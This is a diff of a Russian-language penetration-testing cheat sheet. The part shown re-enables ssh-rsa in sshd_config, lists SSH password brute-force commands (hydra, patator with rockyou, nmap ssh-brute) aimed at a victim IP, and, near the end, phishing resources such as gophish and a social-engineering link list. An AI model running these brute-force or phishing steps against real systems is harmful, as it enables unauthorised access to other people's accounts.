@@ -1,20 +1,23 @@
 Скрипты автоматизации
 ====
 ## SSH
-Проблема подключения putty к SSH через ключ (если это RSA)
+### Проблема подключения putty к SSH через ключ (если это RSA)
 
 ```
 echo ‘PubkeyAcceptedAlgorithms +ssh-rsa’ >> /etc/ssh/sshd_config
 ```
-Перебор паролей:
+## Перебор паролей:
 
 ```
 hydra -V -f -t 4 -l root -P pass.txt ssh://<victim_ip>
 patator ssh_login host=<victim_ip> user=john password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed.'
+nmap -p22 --script=ssh-brute --script-args userdb=users.txt,passdb=pass.txt 172.16.60.1
 ```
 
+## Получить размер директории
+
 ```
-nmap -p22 --script=ssh-brute --script-args userdb=users.txt,passdb=pass.txt 172.16.60.1
+du -sh /home
 ```
 
 ## Excel
@@ -791,4 +794,4 @@ https://getgophish.com/
 3. mail.ru, gmail.com, yandex.ru
 4. https://github.com/giuliacassara/awesome-social-engineering
 5. https://www.verifyemailaddress.org/
-6. 
+
